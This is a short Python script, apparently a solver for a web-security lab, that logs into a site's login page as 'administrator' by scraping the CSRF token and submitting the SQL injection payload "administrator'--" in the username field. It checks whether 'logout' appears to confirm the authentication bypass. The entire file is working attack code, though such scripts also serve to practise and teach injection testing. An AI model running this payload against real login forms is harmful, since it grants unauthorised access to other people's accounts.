import requests
from bs4 import BeautifulSoup


def simpleSQL(url):
    url1 = url + "login"
    session = requests.session()
    resp1 = session.get(url1).text
    soup = BeautifulSoup(resp1, "html.parser")
    csrf = soup.find('input', {'name': 'csrf'})['value']
    response = session.post(url1, data={"username": "administrator'--", "password": "aaa", "csrf": csrf})
    if "logout" in response.text:
        return 1
    else:
        return 0

